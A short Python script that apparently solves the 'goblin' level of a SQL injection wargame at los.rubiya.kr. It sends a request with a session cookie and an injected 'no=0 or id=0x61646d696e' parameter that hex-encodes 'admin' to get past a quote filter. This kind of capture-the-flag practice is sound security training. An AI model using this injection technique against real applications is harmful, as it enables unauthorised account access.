import requests

url = "https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?"
cookie = {'PHPSESSID':'aiub2r5p1f79164953a9ofa28v'}

def solve():
    query = "no=0%20or%20id=0x61646d696e"
    res = requests.get(url=url+query,cookies=cookie)
    if "GOBLIN Clear!" in res.text:
        print("GOBLIN Clear!")

if __name__ == "__main__":
    solve()
